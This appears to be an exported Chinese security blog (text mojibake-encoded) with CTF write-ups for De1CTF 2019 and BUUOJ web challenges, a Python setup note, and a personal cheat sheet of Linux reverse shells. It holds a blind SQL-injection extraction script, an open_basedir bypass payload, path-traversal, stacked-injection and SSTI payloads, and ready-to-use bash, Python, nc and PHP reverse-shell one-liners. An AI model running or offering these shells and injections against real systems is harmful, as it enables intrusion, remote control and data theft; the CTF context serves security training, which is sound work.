<p>ç›´æ¥å†™ä¸ªè„šæœ¬è·‘å°±è¡Œäº†ï¼Œè¿™é‡Œè´´glzjinå¸ˆå‚…å†™çš„äºŒåˆ†æ³•è„šæœ¬ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    get_all_databases()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    r = requests.post(<span class="string">'http://222.85.25.41:8090/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'login admin\'/**/and/**/('</span> + payload + <span class="string">')/**/and/**/\'1\'=\'1 admin'</span>, <span class="string">'totp'</span>: totp.now()&#125;,</span><br><span class="line">                      data=&#123;<span class="string">'dir'</span>: <span class="string">'/'</span>, <span class="string">'pos'</span>: <span class="string">'/'</span>, <span class="string">'filename'</span>: <span class="string">'usage.md'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'login admin\'/**/and/**/('</span> + payload + <span class="string">')/**/and/**/\'1\'=\'1 admin'</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_databases</span><span class="params">()</span>:</span></span><br><span class="line">    db_payload = <span class="string">"select/**/concat(password)/**/from/**/users"</span></span><br><span class="line">    db_name = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">64</span>):</span><br><span class="line">        db_name_payload = <span class="string">"ascii(substr(("</span> + db_payload + <span class="string">"),%d,1))"</span> % (</span><br><span class="line">            y)</span><br><span class="line">        db_name += chr(half(db_name_payload))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"å€¼ï¼š"</span> + db_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span><span class="params">(payload)</span>:</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) / <span class="number">2</span></span><br><span class="line">        mid_num_payload = <span class="string">"%s/**/&gt;/**/%d"</span> % (payload, mid)</span><br><span class="line">        <span class="keyword">if</span> http_get(mid_num_payload):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    mid_num = int((low + high + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_num</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-d0a438ddc4d2b48a.png" alt></p>
<p>å¾—åˆ°adminç”¨æˆ·çš„å¯†ç ä¸ºhint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}ï¼Œæ‰€ä»¥å¯ä»¥ç™»å…¥adminç”¨æˆ·ï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">login</span> <span class="keyword">admin</span> hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-564f5bd7fb859949.png" alt></p>
<p><strong>ç¬¬äºŒå±‚è€ƒç‚¹ï¼šbypass open_basedir</strong></p>
<p>åˆ©ç”¨targetingéšä¾¿ç»™ä¸€äº›å‚æ•°èµ‹å€¼ï¼Œå¯ä»¥å‘ç°å½“å‰shell.phpæ‰§è¡Œçš„æ˜¯phpä»£ç ï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯åˆ©ç”¨phpä»£ç æ¥è¯»å–flagï¼Œå› ä¸ºèµ‹å€¼æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨ä»£ç æ‹¼æ¥ï¼ŒæŸ¥çœ‹phpinfo()</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">targeting <span class="selector-tag">a</span> phpinfo</span><br><span class="line">targeting <span class="selector-tag">b</span> assert</span><br><span class="line">targeting c &#123;<span class="variable">$b</span>(<span class="variable">$a</span>())&#125;</span><br></pre></td></tr></table></figure>

<p>è¿”å›çš„System Fatal Error! ä¹Ÿæ˜¯ä¸€ä¸ªå‘ï¼Œè¿™ç«Ÿç„¶æ˜¯æ‰§è¡ŒæˆåŠŸäº†ï¼ŒæŸ¥çœ‹è¿”å›åŒ…å°±å°±å¥½</p>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-f5766be5b74f8d06.png" alt></p>
<p>å¯çŸ¥å­˜åœ¨open_basedirï¼Œä¹Ÿè®¾ç½®äº†disable_functionï¼Œæ‰€ä»¥è¦ç»•open_basediræ¥è¯»å–å…¶ä»–ç›®å½•æ–‡ä»¶ï¼Œå‚è€ƒï¼š<a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a> è¿›è¡Œä»£ç æ‹¼æ¥ï¼Œbypass open_basedirçš„payloadï¼š</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'css'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="selector-tag">echo</span>(file_get_contents(<span class="string">'flag'</span>));</span><br></pre></td></tr></table></figure>

<p>å·²ç»çŸ¥é“äº†éœ€è¦è·¨ä¸¤å±‚ç›®å½•ï¼Œæ‰€ä»¥æ”¹å†™payloadä¸ºï¼š</p>
<figure class="highlight puppet"><table><tr><td class="code"><pre><span class="line">targeting a chdir</span><br><span class="line">targeting b css</span><br><span class="line">targeting <span class="keyword">c</span> &#123;<span class="variable">$a</span>(<span class="variable">$b</span>)&#125;</span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">d</span> <span class="keyword">ini_set</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">e</span> <span class="keyword">open_basedir</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">f</span> ..</span><br><span class="line">targeting <span class="keyword">g</span> &#123;<span class="variable">$d</span>(<span class="variable">$e</span>,<span class="variable">$f</span>)&#125;</span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">h</span> &#123;<span class="variable">$a</span>(<span class="variable">$f</span>)&#125;</span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">i</span> &#123;<span class="variable">$a</span>(<span class="variable">$f</span>)&#125;</span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">j</span> <span class="keyword">base64_</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">k</span> <span class="keyword">decode</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">l</span> $j<span class="variable">$k</span></span><br><span class="line">targeting m Ly8v</span><br><span class="line">targeting <span class="keyword">n</span> &#123;<span class="variable">$l</span>(<span class="variable">$m</span>)&#125;</span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">o</span> &#123;<span class="variable">$d</span>(<span class="variable">$e</span>,<span class="variable">$n</span>)&#125;</span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">p</span> <span class="keyword">print_r</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">q</span> <span class="keyword">file_get_</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">r</span> <span class="keyword">contents</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">s</span> $q<span class="variable">$r</span></span><br><span class="line">targeting t flag</span><br><span class="line">targeting <span class="keyword">u</span> &#123;<span class="variable">$p</span>(<span class="variable">$s</span>(<span class="variable">$t</span>))&#125;</span><br><span class="line"><span class="keyword">launch</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-01f11aad51f49599.png" alt></p>
<h3 id="0x05-9calc"><a href="#0x05-9calc" class="headerlink" title="0x05 9calc"></a>0x05 9calc</h3><p>ç›´æ¥å¼ƒäº†~<br>æºç åœ°å€ï¼š<a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/de1ctf2019/9-calc" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/tree/master/de1ctf2019/9-calc</a><br>å®˜æ–¹wpï¼š<a href="https://github.com/zsxsoft/my-ctf-challenges/blob/master/calcalcalc-family/3.mdh" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/blob/master/calcalcalc-family/3.mdh</a></p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>open_basedir</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows10æ­å»ºpython2å’Œpython3ã€pip2å’Œpip3å…±å­˜ç¯å¢ƒæ­å»º</title>
    <url>/2019/08/04/Windows10%E6%90%AD%E5%BB%BApython2%E5%92%8Cpython3%E3%80%81pip2%E5%92%8Cpip3%E5%85%B1%E5%AD%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p><strong>æœ€è¿‘æ–°æ¢äº†ç”µè„‘ï¼Œè£…ç¯å¢ƒçœŸçš„è£…åˆ°äº†è‡ªé—­ï¼Œè€ç”µè„‘è£…çš„æ˜¯python2ç¯å¢ƒï¼Œæ²¡æœ‰è£…python3ï¼Œæ–°ç”µè„‘æ‰“ç®—ä¸¤ä¸ªç¯å¢ƒéƒ½è£…ä¸Šï¼Œè®©ä¸¤ä¸ªç‰ˆæœ¬ä»¥åŠpipåŒæ—¶å¯ç”¨ï¼Œè¿™é‡Œç®€å•è®°å½•ä¸‹</strong></p>
<h3 id="0x01-ä¸‹è½½åœ°å€"><a href="#0x01-ä¸‹è½½åœ°å€" class="headerlink" title="0x01 ä¸‹è½½åœ°å€"></a>0x01 ä¸‹è½½åœ°å€</h3><p><a href="https://www.python.org/downloads/ï¼Œåˆ†åˆ«ä¸‹è½½python2å’Œpython3å³å¯" target="_blank" rel="noopener">https://www.python.org/downloads/ï¼Œåˆ†åˆ«ä¸‹è½½python2å’Œpython3å³å¯</a></p>
<h3 id="0x02-ç¯å¢ƒå˜é‡"><a href="#0x02-ç¯å¢ƒå˜é‡" class="headerlink" title="0x02 ç¯å¢ƒå˜é‡"></a>0x02 ç¯å¢ƒå˜é‡</h3><p>ä¿®æ”¹python2æ–‡ä»¶å¤¹ä¸­python.exeå’Œpythonw.exeåˆ†åˆ«ä¸ºpython2.exeå’Œpythonw2.exeï¼›<br>ä¿®æ”¹python3æ–‡ä»¶å¤¹ä¸­python.exeå’Œpythonw.exeåˆ†åˆ«ä¸ºpython3.exeå’Œpythonw3.exe<br>ï¼ˆæ³¨ï¼šæ–¹ä¾¿ç”¨çš„è¯ä¿®æ”¹å…¶ä¸­ä¸€ä¸ªç‰ˆæœ¬å°±å¥½äº†ï¼Œæ¯”å¦‚æˆ‘å°±ä¿®æ”¹python3çš„ï¼‰<br>ç„¶ååˆ†åˆ«å°†pythonè·¯å¾„ä»¥åŠScripts(é‡Œé¢æœ‰easy_installå’Œpip)æ–‡ä»¶å¤¹è·¯å¾„åŠ å…¥ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚æˆ‘çš„pythonè·¯å¾„åˆ†åˆ«ä¸º</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">D:<span class="tag">\<span class="name">Python</span></span>3<span class="tag">\</span></span><br><span class="line">D:<span class="tag">\<span class="name">Python</span></span>3<span class="tag">\<span class="name">Scripts</span></span></span><br><span class="line">D:<span class="tag">\<span class="name">Python</span></span>27</span><br><span class="line">D:<span class="tag">\<span class="name">Python</span></span>27<span class="tag">\<span class="name">Scripts</span></span></span><br></pre></td></tr></table></figure>
<h3 id="0x03-åˆ†åˆ«é‡è£…ä¸¤ä¸ªç‰ˆæœ¬çš„pip"><a href="#0x03-åˆ†åˆ«é‡è£…ä¸¤ä¸ªç‰ˆæœ¬çš„pip" class="headerlink" title="0x03 åˆ†åˆ«é‡è£…ä¸¤ä¸ªç‰ˆæœ¬çš„pip"></a>0x03 åˆ†åˆ«é‡è£…ä¸¤ä¸ªç‰ˆæœ¬çš„pip</h3><p>ä¸¤ä¸ªç‰ˆæœ¬éƒ½é»˜è®¤å¸¦æœ‰pipçš„ï¼Œå·²è£…çš„çš„pip.exeæ˜¯é»˜è®¤ä»¥python.exeæ–‡ä»¶å¯åŠ¨çš„ï¼Œè€Œæˆ‘ä»¬å‰é¢ä¿®æ”¹python.exeåˆ†åˆ«ä¸ºpython2å’Œpython3ï¼Œæ‰€ä»¥é»˜è®¤çš„pipæ‰¾ä¸åˆ°å¯åŠ¨æ–‡ä»¶ä¾¿æ— æ³•æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œé‡è£…ï¼Œåˆ†åˆ«æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">python2</span> <span class="literal">-</span><span class="comment">m</span> <span class="comment">pip</span> <span class="comment">install</span> --<span class="comment">upgrade</span> <span class="comment">pip</span> --<span class="comment">force</span><span class="literal">-</span><span class="comment">reinstall</span></span><br><span class="line"><span class="comment">python3</span> <span class="literal">-</span><span class="comment">m</span> <span class="comment">pip</span> <span class="comment">install</span> --<span class="comment">upgrade</span> <span class="comment">pip</span> --<span class="comment">force</span><span class="literal">-</span><span class="comment">reinstall</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/04/Windows10%E6%90%AD%E5%BB%BApython2%E5%92%8Cpython3%E3%80%81pip2%E5%92%8Cpip3%E5%85%B1%E5%AD%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/8418106-eaf361a2202574e6.png" alt></p>
]]></content>
      <categories>
        <category>æ°´æ»´éšç¬”</category>
      </categories>
      <tags>
        <tag>ç¯å¢ƒæ­å»º</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux å‡ ç§åå¼¹shellæ–¹å¼</title>
    <url>/2019/08/02/Linux-%E5%87%A0%E7%A7%8D%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p><strong>å†™ç®€å•äº›ç»™è‡ªå·±ç”¨çš„ï¼Œçœå¾—æ¯æ¬¡è®°ä¸ä½éƒ½å¾—é åº¦å¨˜</strong><br>æ¥æ”¶ç«¯ä¸»æœºåˆ©ç”¨ncç›‘å¬ç«¯å£</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Windowsï¼šnc -l -v -p <span class="number">8888</span></span><br><span class="line">Linuxï¼šnc -lvvp <span class="number">8888</span></span><br></pre></td></tr></table></figure>
<p>æ”¾ä¸ªnc: <a href="https://pan.baidu.com/s/1B0jehdcst5aYR0HLbXSM9w" target="_blank" rel="noopener">https://pan.baidu.com/s/1B0jehdcst5aYR0HLbXSM9w</a> æå–ç : 9vya</p>
<h3 id="0x01-bash"><a href="#0x01-bash" class="headerlink" title="0x01 bash"></a>0x01 bash</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip<span class="built_in">/port </span>0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h3 id="0x02-python"><a href="#0x02-python" class="headerlink" title="0x02 python"></a>0x02 python</h3><figure class="highlight csp"><table><tr><td class="code"><pre><span class="line">python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">'ip'</span>,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([<span class="string">'/bin/bash'</span>,<span class="string">'-i'</span>]);"</span><br></pre></td></tr></table></figure>

<h3 id="0x03-nc"><a href="#0x03-nc" class="headerlink" title="0x03 nc"></a>0x03 nc</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#çœ‹ncç‰ˆæœ¬ï¼Œæœ‰çš„ncæ²¡æœ‰-eå‚æ•°</span></span><br><span class="line">nc -e /bin/bash<span class="built_in"> ip </span>port</span><br></pre></td></tr></table></figure>

<h3 id="0x04-php"><a href="#0x04-php" class="headerlink" title="0x04 php"></a>0x04 php</h3><figure class="highlight pf"><table><tr><td class="code"><pre><span class="line">php -r 'exec(<span class="string">"/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>);' <span class="comment">#è¿™ä¸ªæµ‹æ²¡æˆï¼Œå…ˆç•™ç€è°ƒè°ƒå†è¯´</span></span><br><span class="line">php -r '<span class="variable">$sock</span>=fsockopen(<span class="string">"ip"</span>,<span class="keyword">port</span>);exec(<span class="string">"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);'</span><br><span class="line">php -r '<span class="variable">$sock</span>=fsockopen(<span class="string">"ip"</span>,<span class="keyword">port</span>);exec(<span class="string">"/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3"</span>);' <span class="comment">#Centos</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#phpæ ‡å‡†è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°socketä¸­ï¼Œä¸å€ŸåŠ©å…¶ä»–è¯­è¨€æ”¯æŒ</span></span><br><span class="line">$sock = fsockopen($ip, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>æ°´æ»´éšç¬”</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>åå¼¹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUOJ Webç»ƒæ‰‹è®°å½•</title>
    <url>/2019/08/01/BUUOJ-Web%E7%BB%83%E6%89%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>æœ€è¿‘å‘ç°åŒ—äº¬è”åˆå¤§å­¦çš„OJå¹³å°ç‰¹åˆ«ä¸é”™ï¼Œé¢˜ç›®éƒ½æ˜¯è¿‘æœŸæ¯”èµ›çš„é¢˜ï¼Œæœ‰äº›æ˜¯åœ¨æ¯”èµ›ä¸­è§£å‡ºäº†çš„ï¼Œæœ‰äº›æ²¡æœ‰è§£å‡ºåˆšå¥½æƒ³è¦å¤ç°ï¼Œè¿™é‡Œç®€å•è®°å½•ä¸‹è§£é¢˜çš„æ€è·¯è¿‡ç¨‹ï¼Œæœ‰æ—¶é—´ç»ƒæ‰‹å°±æ›´æ–°ã€‚å¹³å°åœ°å€ï¼š<a href="https://buuoj.cn/" target="_blank" rel="noopener">https://buuoj.cn/</a></p>
<h3 id="0x01-Warmup"><a href="#0x01-Warmup" class="headerlink" title="0x01 Warmup"></a>0x01 Warmup</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">            $_page = mb_substr(</span></span><br><span class="line"><span class="php">                $page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">            $_page = urldecode($page);</span></span><br><span class="line"><span class="php">            $_page = mb_substr(</span></span><br><span class="line"><span class="php">                $_page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">    ) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>è€ƒç‚¹ä¸º <strong>phpmyadmin4.8.1è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´(CVE-2018-12613)</strong> ï¼Œpayloadï¼š</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">file</span>=hint.php?..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/ffffllllaaaagggg</span></span><br></pre></td></tr></table></figure>

<h3 id="0x02-éšä¾¿æ³¨"><a href="#0x02-éšä¾¿æ³¨" class="headerlink" title="0x02 éšä¾¿æ³¨"></a>0x02 éšä¾¿æ³¨</h3><p>ï¼ˆå¼ºç½‘æ¯çº¿ä¸Šé¢˜ï¼‰</p>
<p>è€ƒç‚¹ä¸ºå †å æ³¨å…¥ï¼Œä¹Ÿå°±æ˜¯ä»¥ç”¨åˆ†å·æ‰§è¡Œå¤šæ¡sqlæ³¨å…¥è¯­å¥ï¼Œå¹¶ä¸”banäº†selectç­‰æŸ¥è¯¢å…³é”®å­—ï¼Œä¸è¿‡é¢˜ç›®ç¯å¢ƒè®¾ç½®é»˜è®¤å­˜åœ¨ä¸€ä¸ªselectï¼Œæ‰€ä»¥é€»è¾‘å°±æ˜¯åœ¨flagæ‰€åœ¨çš„è¡¨æ’å…¥ä¸€ä¸ªidåˆ—ï¼Œå°†åŸè¡¨æ”¹åä¸ºå…¶ä»–ï¼Œflagè¡¨æ”¹åä¸ºæŸ¥è¯¢è¡¨ï¼Œç›´æ¥æŸ¥è¯¢id=1ï¼Œå³å¯å¾—åˆ°flagã€‚æŸ¥è¯¢è¡¨åè¯­å¥:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æŸ¥çœ‹åˆ°å­˜æ”¾flagçš„è¡¨1919810931114514å’Œå½“å‰æŸ¥è¯¢è¡¨wordsï¼Œpayload:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">add</span> <span class="string">`id`</span> <span class="built_in">INT</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'1'</span> <span class="keyword">after</span> <span class="string">`flag`</span>;<span class="keyword">rename</span> <span class="keyword">table</span> words <span class="keyword">to</span> words1;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> words;desc words;</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥æŸ¥è¯¢id=1å³å¯å¾—flag</p>
<h3 id="0x03-easy-tornado"><a href="#0x03-easy-tornado" class="headerlink" title="0x03 easy_tornado"></a>0x03 easy_tornado</h3><p>ï¼ˆæŠ¤ç½‘æ¯ï¼‰</p>
<p>æ ¹æ®æŸ¥çœ‹æ–‡ä»¶å†…å®¹çš„urlï¼š/file?filename=/hints.txt&amp;filehash=bf60e1051f59dbb931208200bcf8c08e ä»¥åŠhint.txtä¸­çš„æç¤ºå†…å®¹ï¼šmd5(cookie_secret+md5(filename))å¯ä»¥å¾ˆæ¸…æ¥šè¯¥é¢˜å¾—é€»è¾‘ï¼Œä»¤filename=/fllllllllllllagï¼Œæ‰¾åˆ°cookie_secretï¼Œè®¡ç®—å‡ºfilehashå€¼å³å¯ï¼Œè¯¥é¢˜è€ƒç‚¹åœ¨äºsstiï¼Œsstiç‚¹åœ¨/msg={{}}å¤„ï¼Œæ‰€ä»¥æŸ¥çœ‹{{handle_settings}} å¯ä»¥å¾—åˆ°ç›¸å…³çš„é…ç½®ä¿¡æ¯ï¼Œå…¶ä¸­cookie_secret=M)Z.&gt;}{O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*rç”¨äºè®¡ç®—filehash</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie_secret = <span class="string">'M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r'</span>;</span><br><span class="line">$filename = <span class="string">'/fllllllllllllag'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($cookie_secret.md5($filename));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#è®¡ç®—å¾—filehash=70aed71508e50d160a73756a21e9953d</span></span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆpayload:</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">/<span class="meta">file</span>?<span class="meta">filename</span>=/fllllllllllllag<span class="variable">&amp;filehash</span>=70aed71508e50d160a73756a21e9953d</span><br></pre></td></tr></table></figure>



